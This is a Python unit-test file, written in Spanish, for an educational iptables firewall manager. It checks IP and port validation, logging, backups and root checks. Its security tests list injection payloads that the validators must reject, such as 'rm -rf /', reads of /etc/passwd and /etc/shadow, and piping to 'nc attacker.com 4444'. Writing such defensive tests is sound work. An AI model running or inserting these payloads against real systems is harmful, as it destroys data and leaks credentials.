#!/usr/bin/env python3
"""
Tests automatizados para Iptables Secure Manager
Proyecto educativo de ciberseguridad - DevSecOps
"""

import unittest
import sys
import os
import tempfile
import subprocess
from unittest.mock import patch, MagicMock

# Agregar el directorio src al path para importar el módulo
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

try:
    from Iptables import (
        validar_ip, validar_puerto, crear_backup, 
        mostrar_reglas, log, limpiar_pantalla, banner
    )
except ImportError as e:
    print(f"Error importando módulos: {e}")
    print("Asegúrate de que el archivo src/Iptables.py existe")
    sys.exit(1)


class TestValidaciones(unittest.TestCase):
    """Tests para funciones de validación"""
    
    def test_validar_ip_validas(self):
        """Test IPs válidas"""
        ips_validas = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "127.0.0.1",
            "0.0.0.0",
            "255.255.255.255"
        ]
        
        for ip in ips_validas:
            with self.subTest(ip=ip):
                self.assertTrue(validar_ip(ip), f"IP {ip} debería ser válida")
    
    def test_validar_ip_invalidas(self):
        """Test IPs inválidas"""
        ips_invalidas = [
            "256.256.256.256",
            "192.168.1",
            "192.168.1.1.1",
            "texto",
            "192.168.1.a",
            "",
            "192.168.1.256"
        ]
        
        for ip in ips_invalidas:
            with self.subTest(ip=ip):
                self.assertFalse(validar_ip(ip), f"IP {ip} debería ser inválida")
    
    def test_validar_puerto_validos(self):
        """Test puertos válidos"""
        puertos_validos = ["1", "80", "443", "8080", "65535"]
        
        for puerto in puertos_validos:
            with self.subTest(puerto=puerto):
                self.assertTrue(validar_puerto(puerto), f"Puerto {puerto} debería ser válido")
    
    def test_validar_puerto_invalidos(self):
        """Test puertos inválidos"""
        puertos_invalidos = ["0", "-1", "65536", "texto", "", "80a"]
        
        for puerto in puertos_invalidos:
            with self.subTest(puerto=puerto):
                self.assertFalse(validar_puerto(puerto), f"Puerto {puerto} debería ser inválido")


class TestFuncionesBasicas(unittest.TestCase):
    """Tests para funciones básicas del sistema"""
    
    def setUp(self):
        """Configuración inicial para cada test"""
        self.temp_dir = tempfile.mkdtemp()
        self.original_log_file = os.environ.get('LOG_FILE', 'iptables_rules.log')
        os.environ['LOG_FILE'] = os.path.join(self.temp_dir, 'test.log')
    
    def tearDown(self):
        """Limpieza después de cada test"""
        os.environ['LOG_FILE'] = self.original_log_file
        # Limpiar archivos temporales
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_log_function(self):
        """Test función de logging"""
        from Iptables import LOG_FILE
        test_message = "Test message for logging"
        
        log(test_message)
        
        # Verificar que el log se creó y contiene el mensaje
        self.assertTrue(os.path.exists(LOG_FILE))
        
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn(test_message, content)
            self.assertIn('[', content)  # Timestamp format
    
    @patch('builtins.print')
    @patch('os.system')
    def test_limpiar_pantalla(self, mock_system, mock_print):
        """Test función limpiar pantalla (multiplataforma)"""
        limpiar_pantalla()
        if os.name == 'nt':
            mock_system.assert_called_once()
        else:
            mock_print.assert_called_once_with('\033[H\033[J', end='')
    
    @patch('builtins.print')
    def test_banner(self, mock_print):
        """Test función banner"""
        banner()
        # Verificar que se llamó a print varias veces (el banner tiene múltiples líneas)
        self.assertTrue(mock_print.call_count > 5)


class TestEjecucionComandos(unittest.TestCase):
    """Tests para ejecución de comandos del sistema"""
    
    @patch('subprocess.run')
    def test_ejecutar_comando_exitoso(self, mock_run):
        """Test ejecución de comando exitoso"""
        # Configurar mock para simular comando exitoso
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Command output",
            stderr=""
        )
        
        from Iptables import ejecutar_comando
        
        resultado = ejecutar_comando(["echo", "test"], mostrar_salida=False)
        self.assertTrue(resultado)
        mock_run.assert_called_once_with(
            ["echo", "test"],
            shell=False,
            check=True,
            capture_output=True,
            text=True
        )
    
    @patch('subprocess.run')
    def test_ejecutar_comando_fallido(self, mock_run):
        """Test ejecución de comando fallido"""
        # Configurar mock para simular comando fallido
        mock_run.side_effect = subprocess.CalledProcessError(1, "test", "Error output")
        
        from Iptables import ejecutar_comando
        
        resultado = ejecutar_comando("comando_inexistente", mostrar_salida=False)
        self.assertFalse(resultado)


class TestBackup(unittest.TestCase):
    """Tests para funciones de backup"""
    
    def setUp(self):
        """Configuración inicial"""
        self.temp_dir = tempfile.mkdtemp()
        self.original_cwd = os.getcwd()
        os.chdir(self.temp_dir)
    
    def tearDown(self):
        """Limpieza"""
        os.chdir(self.original_cwd)
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('subprocess.run')
    def test_crear_backup_exitoso(self, mock_run):
        """Test creación de backup exitoso"""
        # Configurar mock para simular comando exitoso
        mock_run.return_value = MagicMock(returncode=0)
        
        backup_file = crear_backup()
        
        self.assertIsNotNone(backup_file)
        self.assertTrue(backup_file.startswith('iptables_backup_'))
        self.assertTrue(backup_file.endswith('.rules'))
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_crear_backup_fallido(self, mock_run):
        """Test creación de backup fallido"""
        # Configurar mock para simular comando fallido
        mock_run.return_value = MagicMock(returncode=1)
        
        backup_file = crear_backup()
        
        self.assertIsNone(backup_file)


class TestIntegracion(unittest.TestCase):
    """Tests de integración para el sistema completo"""
    
    def test_import_modulo_completo(self):
        """Test que todas las funciones principales se pueden importar"""
        funciones_esperadas = [
            'validar_ip', 'validar_puerto', 'ejecutar_comando',
            'crear_backup', 'mostrar_reglas', 'log', 'limpiar_pantalla',
            'banner', 'verificar_root', 'proteger_syn_flood',
            'limitar_acceso_ssh', 'prevenir_ataques_dos',
            'evitar_escaneo_de_puertos', 'bloquear_ip',
            'desbloquear_ip', 'guardar_reglas', 'restaurar_backup',
            'menu_principal', 'main'
        ]
        
        from Iptables import *
        
        for funcion in funciones_esperadas:
            with self.subTest(funcion=funcion):
                self.assertTrue(
                    callable(globals().get(funcion)) or 
                    callable(locals().get(funcion)),
                    f"Función {funcion} debería ser callable"
                )
    
    def test_flujo_validacion_tipico(self):
        """Test flujo típico de validación"""
        # Simular flujo de validación de entrada de usuario
        ip_valida = "192.168.1.100"
        puerto_valido = "22"
        
        # Validaciones
        self.assertTrue(validar_ip(ip_valida))
        self.assertTrue(validar_puerto(puerto_valido))
        
        # Combinación de validaciones
        self.assertTrue(validar_ip(ip_valida) and validar_puerto(puerto_valido))
    
    @patch('os.geteuid')
    def test_verificacion_root(self, mock_geteuid):
        """Test verificación de privilegios de root"""
        from Iptables import verificar_root
        
        # Test como root
        mock_geteuid.return_value = 0
        try:
            verificar_root()  # No debería lanzar excepción
        except SystemExit:
            self.fail("verificar_root() no debería salir con uid=0")
        
        # Test sin root
        mock_geteuid.return_value = 1000
        with self.assertRaises(SystemExit):
            verificar_root()


class TestSeguridad(unittest.TestCase):
    """Tests específicos de seguridad"""
    
    def test_injection_en_validacion_ip(self):
        """Test prevención de inyección en validación IP"""
        inputs_maliciosos = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker.com 4444",
            "$(whoami)",
            "`id`"
        ]
        
        for input_malicioso in inputs_maliciosos:
            with self.subTest(input=input_malicioso):
                self.assertFalse(validar_ip(input_malicioso))
    
    def test_injection_en_validacion_puerto(self):
        """Test prevención de inyección en validación de puerto"""
        inputs_maliciosos = [
            "80; rm -rf /",
            "22 && cat /etc/shadow",
            "443 | nc attacker.com 4444",
            "$(whoami)",
            "`id`"
        ]
        
        for input_malicioso in inputs_maliciosos:
            with self.subTest(input=input_malicioso):
                self.assertFalse(validar_puerto(input_malicioso))


if __name__ == '__main__':
    # Configurar entorno de testing
    print("=" * 60)
    print("IPTABLES SECURE MANAGER - SUITE DE PRUEBAS")
    print("Proyecto Educativo de Ciberseguridad")
    print("=" * 60)
    
    # Ejecutar tests
    unittest.main(verbosity=2)
